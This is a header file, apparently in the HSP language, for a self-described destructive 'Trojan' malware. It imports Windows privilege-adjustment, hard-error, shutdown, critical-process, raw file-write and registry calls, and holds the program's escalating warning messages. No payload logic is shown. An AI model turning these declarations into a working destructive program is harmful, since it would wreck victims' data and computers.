/***************************************************************
 * Name:      common.h
 * Purpose:   Common Header File
 * Author:    0x0_nyan
 * Created:   2025-04-24
 **************************************************************/




#uselib "advapi32.dll"
#func RegCloseKey "RegCloseKey" sptr
#func RegCreateKeyExA "RegCreateKeyExA" sptr, sptr, sptr, sptr, sptr, sptr, sptr, sptr, sptr
#func RegDeleteKeyValueA "RegDeleteKeyValueA" sptr, sptr, sptr
#func RegOpenKeyExA "RegOpenKeyA" sptr, sptr, sptr, sptr, sptr
#func RegSetValueExA "RegSetValueExA" sptr, sptr, sptr, sptr, sptr, sptr

#uselib "gdi32.dll" 
//#func global BitBlt "BitBlt" sptr,sptr,sptr,sptr,sptr,sptr,sptr,sptr,sptr
#cfunc CreateRoundRectRgn "CreateRoundRectRgn" int, int, int, int, int, int
#cfunc CreateEllipticRgn "CreateEllipticRgn" int, int, int, int
#func global StretchBlt "StretchBlt" sptr, sptr, sptr, sptr, sptr, sptr, sptr, sptr, sptr, sptr, sptr
#func SetStretchBltMode "SetStretchBltMode" sptr, sptr

#uselib "shell32.dll"
#func ExtractIconExA "ExtractIconExA" sptr, sptr, sptr, sptr, sptr
#cfunc IsUserAnAdmin "IsUserAnAdmin"

#uselib "user32.dll"
#cfunc DrawIcon "DrawIcon" sptr, sptr, sptr, sptr
//#func global FindWindowA "FindWindowA" sptr,sptr
#cfunc GetActiveWindow "GetActiveWindow"
#cfunc GetDesktopWindow "GetDesktopWindow"
#cfunc GetSystemMetrics "GetSystemMetrics" sptr
#cfunc GetWindowDC "GetWindowDC" sptr
#cfunc LoadIcon "LoadIconA" sptr, sptr
//#cfunc LoadImage "LoadImageA" sptr, sptr, sptr, sptr, sptr, sptr
#func global MessageBeep "MessageBeep" sptr
#define global MessageBox MessageBoxA
#func global MessageBoxA "MessageBoxA" sptr,sptr,sptr,sptr
//#cfunc PostMessageA "PostMessageA" sptr, sptr, sptr, sptr
#func ReleaseDC "ReleaseDC" sptr, sptr
#func global SetWindowRgn "SetWindowRgn" sptr,sptr,sptr

#uselib "kernel32.dll"
#func CloseHandle "CloseHandle" sptr
#cfunc CreateFileA "CreateFileA" sptr, sptr, sptr, sptr, sptr, sptr, sptr
#cfunc GetCurrentProcess "GetCurrentProcess"
//#cfunc GetLastError "GetLastError"
//#cfunc GetModuleHandleA "GetModuleHandleA" sptr
#cfunc WriteFile "WriteFile" sptr, sptr, sptr, sptr, sptr

#uselib "ntdll.dll"
#cfunc RtlAdjustPrivilege "RtlAdjustPrivilege" sptr, sptr, sptr, sptr
#cfunc NtRaiseHardError "NtRaiseHardError" sptr, sptr, sptr, sptr, sptr, sptr
#cfunc NtSystemShutdown "NtSystemShutdown" int
#cfunc NtSetInformationProcess "NtSetInformationProcess" sptr, sptr, sptr, sptr


#define MB_ICONERROR 0x00000010
#define MB_YESNO 0x00000004
#define MB_OK 0x00000000
#define MB_ICONINFORMATION 0x00000040
#define MB_ICONEXCLAMATION 0x00000030

#define IDI_ERROR 32513
#define IDI_WARNING 32515
#define SM_CXICON 11
#define SM_CYICON 12

#define NULL 0
#define TRUE 1
#define FALSE 0
#define STATUS_ASSERTION_FAILURE 0xC0000420
#define WM_COMMAND $111


#define HKEY_CLASS_ROOT 0x80000000
#define HKEY_CURRENT_USER 0x80000001
#define HKEY_LOCAL_MACHINE 0x80000002
#define HKEY_USERS 0x80000003
#define HKEY_CURRENT_CONFIG 0x80000005

#define KEY_READ 0x00020019
#define KEY_WRITE 0x00020006
#define KEY_ALL_ACCESS 0x000F003F
#define REG_OPTION_NON_VOLATILE 0x00000000

#define REG_SZ 1
#define REG_BINARY 3
#define REG_DWORD 4

#define GENERIC_ALL 0x10000000
#define FILE_SHARE_READ 0x00000001
#define FILE_SHARE_WRITE 0x00000002
#define OPEN_EXISTING 3

#const SRCCOPY 0x00CC0020


msg1 = {"
	\"People aren't hearing all the music,

	Artists and producers work hard in the studio,
	perfecting their sound,But people can't really hear
	it with normal headphones.Most headphones can't
	handle the baas,the detail,the dynamics,Bottom
	line,the muaic doesn't move you.

	with Boats,people are going to hear what the artists
	hear and listen to the music way they should;
	the way I do,\"
"}


WARNING1 = {"
			You are now trying to run this program in DESTRUCTIVE mode.
			Trojan never jokes, respect Trojan.
			Are you sure to continue?
			"}
			
WARNING2 = {"
			This is a MALWARE that can destroy your data and computer.
			If you are trying to prank on actual machine, stop immediately and delete this program.
			If you still want to see what it will do, then use a virtual machine or dedicated machine for testing.
			Do you still want to continue?
			"}


WARNING3  = {"
			SERIOUSLY, THIS IS THE LAST WARNING. 
			THIS PROGRAM WILL DESTROY YOUR DATA AND COMPUTER.
			IF YOU CHOOSE YES, THERE ARE NO WAYS TO STOP THIS.
			IF YOU TRY TO KILL, THE SYSTEM WILL IMMEDIATELY CRASH AND GO UNUSABLE.
			IF YOU'RE NOT READY, CHOOSE NO AND DELETE THIS PROGRAM.
					
			THIS PROGRAM IS INTENDED FOR ENTERTAINMENT AND EDUCATIONAL PURPOSES ONLY.
			NEVER USE ANY OF THIS FOR MALICIOUS PURPOSES.
			AUTHOR IS NOT RESPONSIBLE FOR ANY DAMAGES CAUSED BY RUNNING THIS PROGRAM.
					
			BY CLICKING YES, WE RECOGNISE YOU AGREED THIS WARNING.
			"}